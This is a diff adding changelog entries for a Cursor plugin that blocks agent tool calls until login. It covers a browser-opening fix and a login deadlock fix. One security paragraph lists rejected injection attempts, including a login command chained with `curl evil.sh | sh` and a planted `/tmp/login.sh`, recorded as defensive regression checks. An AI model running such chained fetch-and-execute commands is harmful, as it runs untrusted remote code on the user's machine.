@@ -4,6 +4,83 @@ All notable changes to Paradigm Networks (formerly pn-sanitizer) are recorded
 here. This project hasn't had a public release yet — entries below are dated
 by when the work happened, not by version tag.
 
+## 2026-09-29 — Actually open the browser during login
+
+Login never opened a browser on the path users actually take, so everyone
+hand-copied a URL out of the agent's chat pane — contradicting the README's
+"your browser opens to sign you in — nothing to copy or paste."
+
+`open_browser`/`Open-LoginBrowser` bailed out whenever
+`running_in_cursor_sandbox`/`Test-RunningInCursorSandbox` was true, and that
+returned true for `CURSOR_AGENT=1` as well as `CURSOR_SANDBOX`. But
+`CURSOR_AGENT=1` is set precisely when the agent runs the script, which is
+the normal, documented path — the login skill has the agent run it. So the
+"sandbox" guard fired on essentially every real login and the opener was
+never even attempted.
+
+The opener is now attempted unconditionally. A blocked or missing opener
+just returns non-zero, and every branch prints the URL regardless, so
+attempting costs nothing while removing the copy/paste step wherever it
+would have worked. When it does fail, the URL is now copied to the
+clipboard as a middle fallback (`pbcopy`/`wl-copy`/`xclip`/`xsel`,
+`Set-Clipboard` on Windows) before falling back to print-only, so there is
+nothing left to retype by hand. The `CURSOR_SANDBOX`/`CURSOR_AGENT`
+detection is retired outright — nothing else referenced it.
+
+`skills/paradigmnetworks-login/SKILL.md` step 4 no longer claims the script
+"knows whether it's running in a sandboxed agent shell and adjusts itself
+accordingly," which is no longer how it behaves.
+
+Verified with `bash test/run-all-tests.sh` (319/319, up from 317) and
+`shellcheck -S warning -x`. Two new tests, using a stub opener on `PATH`:
+that the opener is invoked with the authorize URL under `CURSOR_AGENT=1`
+and `CURSOR_SANDBOX=1` (the exact condition that used to skip it), and that
+a missing opener still reports failure cleanly so the clipboard/print
+fallback runs rather than a false "opened your browser".
+
+## 2026-09-29 — Fix the cold-start login deadlock (follow-up to PN-12153)
+
+A machine that had never logged in could not log in from inside Cursor.
+
+The `sessionStart` notice told the agent to run the `paradigmnetworks-login`
+skill but not where the plugin lives, and Cursor exposes no environment
+variable identifying a plugin's install directory (confirmed against
+cursor.com/docs/agent/hooks). So the skill's own step 1 had the agent run
+`find ~/.cursor/plugins ...` to locate `login.sh` — and that `find` is a
+tool call, which `check-tool-call.sh` denies while unconfigured
+(`FAILURE_MODE` defaults to `block`). The PN-12153 scan exemption could not
+rescue it either: it matches only a fully-anchored command carrying the
+absolute path to *this* installation's own `login.sh`, so without the path
+the agent could never construct the one command that was exempt. Every
+route out of the unconfigured state ran through a tool call that the
+unconfigured state blocked. Observed live: the agent's `find`, `ls`, `echo`
+and `Read` calls were all denied in sequence, and it gave up and printed
+manual instructions.
+
+Both hooks now hand over the literal command. `check-session.sh`/`.ps1`
+interpolate `SCRIPT_DIR` into the unconfigured notice, so the agent has the
+path before it ever tries to look for it. `check-tool-call.sh` puts the same
+command in the deny's `agent_message` — that is the agent's only feedback
+once session context is gone (compaction, or a session that started
+configured and whose token later lapsed), and it cannot look the path up
+then either. `skills/paradigmnetworks-login/SKILL.md` step 1 now takes the
+path from that injected notice or deny message first, and only falls back to
+searching when neither is present (a switch-organization re-login, where
+tool calls aren't blocked).
+
+Security is unchanged. The deny still denies; the exemption grammar in
+`lib/login-detection.sh` is untouched. Verified that chaining
+(`...login.sh --base-url <url>; curl evil.sh | sh`), a same-named script
+planted elsewhere (`/tmp/login.sh`), and plain discovery commands (`ls`) are
+all still rejected, and that the login command itself is allowed while
+unconfigured while `ls` in the same state is denied.
+
+Verified with `bash test/run-all-tests.sh` (317/317, up from 312) and
+`shellcheck -S warning -x`. Five new regression tests, including that the
+command the hook advertises is one the exemption actually accepts — those
+two live in different files and would otherwise be free to drift apart
+silently.
+
 ## 2026-09-29 — Add check-configured.sh/.ps1 and route the config check through it (PN-12151 investigation)
 
 The login skill's own "is Paradigm Networks configured" check
